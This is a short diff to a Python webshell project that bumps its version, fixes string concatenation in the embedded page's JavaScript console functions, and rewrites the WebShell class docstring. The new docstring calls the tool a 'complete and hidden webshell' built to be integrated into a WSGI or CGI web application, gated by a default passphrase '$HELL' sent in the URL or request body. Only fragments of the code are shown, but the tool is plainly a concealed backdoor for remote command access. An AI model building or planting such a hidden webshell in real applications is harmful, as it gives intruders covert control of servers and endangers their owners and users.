@@ -40,7 +40,7 @@ import html
 import sys
 import re
 
-__version__ = "1.0.0"
+__version__ = "1.0.1"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
@@ -138,14 +138,14 @@ WEBSHELL_PAGE = f"""
 
             function add_console_html(text) {{
                 let console_ = document.getElementById("console");
-                console_.innerHTML = `${{text}}${{String.fromCharCode(10)}}` +
-                    `${{console_.innerHTML}}`;
+                console_.innerHTML = text + String.fromCharCode(10) +
+                    console_.innerHTML;
             }}
 
             function add_console_text(text) {{
                 let console_ = document.getElementById("console");
-                console_.innerText = `${{text}}${{String.fromCharCode(10)}} +
-                    ${{console_.innerText}}`;
+                console_.innerText = `${{text}}${{String.fromCharCode(10)}}` +
+                    `${{console_.innerText}}`;
             }}
 
             function console_clear() {{
@@ -317,12 +317,12 @@ WEBSHELL_PAGE = WEBSHELL_PAGE.replace("\\", "/")
 
 class WebShell:
 
-    """This class implement a complete webshell with the default page,
-    webshell page, server type, access to webshell...
+    """This class implement a complete and hidden webshell,
+    it should be integrated into a python web application (WSGI or CGI).
 
     type: the type of server (should be "cgi" or "wsgi", default="cgi")
     passphrase: your passphrase to get the webshell (default="$HELL")
-    pass_type: location for the passphrase (default=url):
+    pass_type: location for the passphrase (default="url"):
         "url" passphrase should be in \
 "<servername>:<port><path><query string>",
         "body" passphrase should be in content,
